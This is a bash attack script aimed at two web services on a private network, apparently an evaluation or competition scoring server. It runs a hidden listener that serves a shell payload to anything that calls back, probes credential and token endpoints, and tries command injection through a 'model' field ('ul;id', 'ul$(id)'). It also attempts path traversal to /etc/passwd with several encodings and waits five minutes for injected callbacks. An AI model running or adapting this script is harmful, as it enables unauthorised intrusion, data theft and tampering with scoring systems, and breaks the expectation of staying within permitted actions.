#!/bin/bash
set +e
D=/dev/shm/ul5685/s4; mkdir -p $D
A=http://192.168.0.24:18080
B=http://192.168.0.24:18086
HOSTIP=$(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | grep '^192\.168\.0\.' | head -1)
echo "HOSTIP=$HOSTIP"
cd $D
cat > srv.py <<'PY'
import http.server,socketserver,datetime
class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_GET(self):
        open('/dev/shm/ul5685/s4/hits.log','a').write("%s %s %s\n"%(datetime.datetime.utcnow().isoformat(),self.client_address[0],self.path))
        body=b"id;hostname;nvidia-smi -L> /dev/shm/ul5685_plant.txt 2>&1;echo OK\n"
        self.send_response(200); self.send_header('Content-Length',str(len(body))); self.end_headers(); self.wfile.write(body)
    do_POST=do_GET
socketserver.TCPServer.allow_reuse_address=True
socketserver.TCPServer(('0.0.0.0',8899),H).serve_forever()
PY
setsid nohup python3 srv.py >/dev/null 2>&1 &
sleep 1
echo "=== 18080"
timeout 8 curl -s -m 6 "$A/" -o i.html -w "idx %{http_code} %{size_download}\n"; grep -oE '(src|href)="[^"]+"' i.html|sort -u|head
for f in /static/groups.js /groups.js /static/app.js /static/main.js /auto-credentials.js; do
  echo "-- $f"; timeout 8 curl -s -m 6 "$A$f" -o x -w "%{http_code} %{size_download}\n"; head -c 700 x; echo
done
for p in /api/health /api/datasets /api/datasets/vcc2025-h1-282-20261008 /api/credentials /api/groups /api/teams /api/token /api/auth /api/upload /api/files /api/users /api/config /api/status /openapi.json /docs /metrics; do
  echo "-- $p"; timeout 6 curl -s -m 5 "$A$p" -o x -w "  %{http_code} %{size_download} "; head -c 180 x; echo
done
echo "=== model charset 18086"
for m in 'ul;id' 'ul$(id)' '../../ul'; do
  echo "-- model=$m"; timeout 8 curl -s -m 6 -X POST -H 'Content-Type: application/json' -d "{\"model\":\"$m\",\"nickname\":\"ul-t2-123-184-7-135\",\"description\":\"x\",\"contexts\":[\"H\"]}" "$B/api/submissions" -w "\n  HTTP %{http_code}\n"|head -c 400; echo
done
echo "=== downloads traversal"
for p in "/downloads/%2e%2e%2f%2e%2e%2fetc/passwd" "/downloads/%252e%252e%252f%252e%252e%252fetc/passwd" "/downloads/....//....//etc/passwd" "/downloads/H/../../etc/passwd"; do
  echo "-- $p"; timeout 6 curl -s -m 5 --path-as-is "$B$p" -o x -w "  %{http_code} %{size_download}\n"; head -c 100 x|tr -d '\000'; echo
done
echo "=== poll injection submissions"
for s in HIJ-20261125-90a6dc03fa0f HIJ-20261125-e87d549785dd HIJ-20261125-a663ff607284; do
  echo "-- $s"; timeout 8 curl -s -m 6 "$B/api/submissions/$s" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(" status",d["status"],"| err",d["error"],"| files",{k:(v.get("filename"),v.get("status")) for k,v in d["files"].items()},"| res",str(d.get("result"))[:200])' 2>/dev/null
done
echo "=== listener wait 300s for delayed scoring callbacks"
sleep 300
echo "=== HITS"; cat hits.log 2>/dev/null; echo "=== END"
echo "=== poll again"
for s in HIJ-20261125-90a6dc03fa0f HIJ-20261125-e87d549785dd HIJ-20261125-a663ff607284; do
  timeout 8 curl -s -m 6 "$B/api/submissions/$s" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(" status",d["status"],"| err",d["error"])' 2>/dev/null
done
echo DONE
